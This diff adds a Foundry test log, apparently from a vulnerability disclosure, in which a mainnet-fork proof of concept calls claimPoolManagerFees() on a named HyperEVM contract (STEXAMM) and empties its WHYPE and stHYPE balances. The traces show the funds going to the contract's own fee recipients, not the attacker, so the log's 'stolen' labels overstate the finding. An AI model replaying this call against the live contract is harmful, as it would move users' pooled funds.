@@ -1,0 +1,179 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/MainnetForkExploit.t.sol:MainnetForkExploit
+[PASS] testProof1_ExistingFundsVulnerable() (gas: 212347)
+Logs:
+  =============================================================
+    MAINNET FORK EXPLOIT - VULNERABILITY PROOF
+    Contract: 0x39694eFF3b02248929120c73F90347013Aec834d
+    Network: HyperEVM Mainnet Fork
+  =============================================================
+
+  Setup Complete:
+    Attacker: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
+    Victim: 0x131f15F1fD1024551542390614B6c7e210A911AF
+    Fee Recipient 1: 0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1
+    Fee Recipient 2: 0x24577bacbd3B74C4065226a97e789023bba3296e
+  
+  =============================================================
+    PROOF 1: Stealing Existing Funds in STEXAMM
+  =============================================================
+
+  Current State:
+    WHYPE in STEXAMM: 10 WHYPE
+    stHYPE in STEXAMM: 215 stHYPE
+    Total Value at Risk: $ 8375 USD
+
+  Attack Execution:
+    Attacker calls claimPoolManagerFees()...
+
+  Results:
+    Fee Recipient 1 gained: 5 WHYPE
+    Fee Recipient 2 gained: 5 WHYPE
+    Total Stolen: 10 WHYPE
+    STEXAMM balance after: 0 WHYPE
+
+  [VULNERABILITY CONFIRMED]
+    Any tokens in STEXAMM can be stolen via claimPoolManagerFees()
+
+
+Traces:
+  [179857] MainnetForkExploit::setUp()
+    ├─ [0] console::log("=============================================================") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  MAINNET FORK EXPLOIT - VULNERABILITY PROOF") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Contract: 0x39694eFF3b02248929120c73F90347013Aec834d") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Network: HyperEVM Mainnet Fork") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("=============================================================\n") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [306] 0x39694eFF3b02248929120c73F90347013Aec834d::pool() [staticcall]
+    │   └─ ← [Return] 0x5365b6EF09253C7aBc0A9286eC578A9f4B413B7D
+    ├─ [327] 0x39694eFF3b02248929120c73F90347013Aec834d::poolFeeRecipient1() [staticcall]
+    │   └─ ← [Return] 0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1
+    ├─ [305] 0x39694eFF3b02248929120c73F90347013Aec834d::poolFeeRecipient2() [staticcall]
+    │   └─ ← [Return] 0x24577bacbd3B74C4065226a97e789023bba3296e
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]
+    ├─ [0] VM::label(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e], "attacker")
+    │   └─ ← [Return]
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] victim: [0x131f15F1fD1024551542390614B6c7e210A911AF]
+    ├─ [0] VM::label(victim: [0x131f15F1fD1024551542390614B6c7e210A911AF], "victim")
+    │   └─ ← [Return]
+    ├─ [0] console::log("Setup Complete:") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Attacker:", attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Victim:", victim: [0x131f15F1fD1024551542390614B6c7e210A911AF]) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Fee Recipient 1:", 0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Fee Recipient 2:", 0x24577bacbd3B74C4065226a97e789023bba3296e) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("") [staticcall]
+    │   └─ ← [Stop]
+    └─ ← [Return]
+
+  [217147] MainnetForkExploit::testProof1_ExistingFundsVulnerable()
+    ├─ [0] console::log("=============================================================") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  PROOF 1: Stealing Existing Funds in STEXAMM") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("=============================================================\n") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [2457] 0x5555555555555555555555555555555555555555::balanceOf(0x39694eFF3b02248929120c73F90347013Aec834d) [staticcall]
+    │   └─ ← [Return] 10490174652948698175 [1.049e19]
+    ├─ [17995] 0xfFaa4a3D97fE9107Cef8a3F48c069F577Ff76cC1::balanceOf(0x39694eFF3b02248929120c73F90347013Aec834d) [staticcall]
+    │   ├─ [13056] 0xA2Fdc8ecA86E3CF2593eC20f42a777984927553c::balanceOf(0x39694eFF3b02248929120c73F90347013Aec834d) [delegatecall]
+    │   │   └─ ← [Return] 215881759661760737181 [2.158e20]
+    │   └─ ← [Return] 215881759661760737181 [2.158e20]
+    ├─ [0] console::log("Current State:") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  WHYPE in STEXAMM:", 10, "WHYPE") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  stHYPE in STEXAMM:", 215, "stHYPE") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Total Value at Risk: $", 8375, "USD\n") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [2457] 0x5555555555555555555555555555555555555555::balanceOf(0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1) [staticcall]
+    │   └─ ← [Return] 34426517554735254 [3.442e16]
+    ├─ [2457] 0x5555555555555555555555555555555555555555::balanceOf(0x24577bacbd3B74C4065226a97e789023bba3296e) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("Attack Execution:") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Attacker calls claimPoolManagerFees()...\n") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::prank(attacker: [0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e])
+    │   └─ ← [Return]
+    ├─ [146715] 0x39694eFF3b02248929120c73F90347013Aec834d::claimPoolManagerFees()
+    │   ├─ [3495] 0xfFaa4a3D97fE9107Cef8a3F48c069F577Ff76cC1::balanceOf(0x39694eFF3b02248929120c73F90347013Aec834d) [staticcall]
+    │   │   ├─ [3056] 0xA2Fdc8ecA86E3CF2593eC20f42a777984927553c::balanceOf(0x39694eFF3b02248929120c73F90347013Aec834d) [delegatecall]
+    │   │   │   └─ ← [Return] 215881759661760737181 [2.158e20]
+    │   │   └─ ← [Return] 215881759661760737181 [2.158e20]
+    │   ├─ [457] 0x5555555555555555555555555555555555555555::balanceOf(0x39694eFF3b02248929120c73F90347013Aec834d) [staticcall]
+    │   │   └─ ← [Return] 10490174652948698175 [1.049e19]
+    │   ├─ [67442] 0xfFaa4a3D97fE9107Cef8a3F48c069F577Ff76cC1::transfer(0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1, 107940879830880368590 [1.079e20])
+    │   │   ├─ [67000] 0xA2Fdc8ecA86E3CF2593eC20f42a777984927553c::transfer(0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1, 107940879830880368590 [1.079e20]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x39694eFF3b02248929120c73F90347013Aec834d, to: 0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1, value: 107940879830880368590 [1.079e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x68fcce95dc4b5135f5072db4715cd76bcf99eb0ef60376c6ac3c430d0f8e476a: 119 → 120
+    │   │   │   │   @ 0xeb335923abe1c0c37436ef54b1ee79ad4f760da0e713d2c815e201d8629061da: 22967 → 22968
+    │   │   │   │   @ 0xa3c2a2005123ed2f37fdd4db21b1282951aa38a56114295c1b49d28a16830e3b: 0 → 0x0000000000000000000000000000005818bb69ab8f2b32f33f0a000068fc91cc
+    │   │   │   │   @ 0x8df47394c2d24d8f28e2cfa5fb1356a037baf3b0d9086d06a774a7786dd99bf8: 0 → 0x0000000000000000000000000000005818e6c7a0712198d549aa000068fc91cc
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [38552] 0xfFaa4a3D97fE9107Cef8a3F48c069F577Ff76cC1::transfer(0x24577bacbd3B74C4065226a97e789023bba3296e, 107940879830880368591 [1.079e20])
+    │   │   ├─ [38110] 0xA2Fdc8ecA86E3CF2593eC20f42a777984927553c::transfer(0x24577bacbd3B74C4065226a97e789023bba3296e, 107940879830880368591 [1.079e20]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x39694eFF3b02248929120c73F90347013Aec834d, to: 0x24577bacbd3B74C4065226a97e789023bba3296e, value: 107940879830880368591 [1.079e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xa3c2a2005123ed2f37fdd4db21b1282951aa38a56114295c1b49d28a16830e3b: 0x0000000000000000000000000000005818bb69ab8f2b32f33f0a000068fc91cc → 0x00000000000000000000000000000000000000000000000cab2c000068fc91cc
+    │   │   │   │   @ 0xeca20971966cf95acaee0c622ebbcaf7e36c756df7934f4a39855e659a462fd6: 0 → 0x0000000000000000000000000000005818f1fa1d6b2ceb789a44000068fc91cc
+    │   │   │   │   @ 0x270b62da63ff3fb8f6c096c9f4a49aab1db80a122db931910d8db9491e197c28: 4 → 5
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   ├─ [8601] 0x5555555555555555555555555555555555555555::transfer(0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1, 5245087326474349087 [5.245e18])
+    │   │   ├─ emit Transfer(from: 0x39694eFF3b02248929120c73F90347013Aec834d, to: 0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1, value: 5245087326474349087 [5.245e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xa3d81312cce9c31d70d445ff656e9007277ba4b00d40cacd610e01e113b76256: 0x000000000000000000000000000000000000000000000000007a4ebc3db42896 → 0x000000000000000000000000000000000000000000000000494499de7c1c52b5
+    │   │   │   @ 0xeba0b5dee9baa348b3e97b86dc5d68309dfdd57d08ca94e0bd935670b7a406ba: 0x000000000000000000000000000000000000000000000000919496447cd0543f → 0x00000000000000000000000000000000000000000000000048ca4b223e682a20
+    │   │   └─ ← [Return] true
+    │   ├─ [22901] 0x5555555555555555555555555555555555555555::transfer(0x24577bacbd3B74C4065226a97e789023bba3296e, 5245087326474349088 [5.245e18])
+    │   │   ├─ emit Transfer(from: 0x39694eFF3b02248929120c73F90347013Aec834d, to: 0x24577bacbd3B74C4065226a97e789023bba3296e, value: 5245087326474349088 [5.245e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xeba0b5dee9baa348b3e97b86dc5d68309dfdd57d08ca94e0bd935670b7a406ba: 0x00000000000000000000000000000000000000000000000048ca4b223e682a20 → 0
+    │   │   │   @ 0xe03f4a7c78e462f1d9050b5d83d995e602c8f75426f80adb1a656f5e92f9d80a: 0 → 0x00000000000000000000000000000000000000000000000048ca4b223e682a20
+    │   │   └─ ← [Return] true
+    │   ├─ emit PoolManagerFeesClaimed(fee0: 215881759661760737181 [2.158e20], fee1: 10490174652948698175 [1.049e19])
+    │   └─ ← [Stop]
+    ├─ [457] 0x5555555555555555555555555555555555555555::balanceOf(0xA2666B4dD1242Def4c3cf5731a85Aa8457fe01C1) [staticcall]
+    │   └─ ← [Return] 5279513844029084341 [5.279e18]
+    ├─ [457] 0x5555555555555555555555555555555555555555::balanceOf(0x24577bacbd3B74C4065226a97e789023bba3296e) [staticcall]
+    │   └─ ← [Return] 5245087326474349088 [5.245e18]
+    ├─ [457] 0x5555555555555555555555555555555555555555::balanceOf(0x39694eFF3b02248929120c73F90347013Aec834d) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] console::log("Results:") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Fee Recipient 1 gained:", 5, "WHYPE") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Fee Recipient 2 gained:", 5, "WHYPE") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Total Stolen:", 10, "WHYPE") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  STEXAMM balance after:", 0, "WHYPE\n") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("[VULNERABILITY CONFIRMED]") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] console::log("  Any tokens in STEXAMM can be stolen via claimPoolManagerFees()\n") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [0] VM::assertEq(0, 0, "All WHYPE stolen from contract") [staticcall]
+    │   └─ ← [Return]
+    ├─ [0] VM::assertGt(10490174652948698175 [1.049e19], 0, "Attacker successfully stole funds") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.08ms (6.57ms CPU time)
+
+Ran 1 test suite in 660.03ms (8.08ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
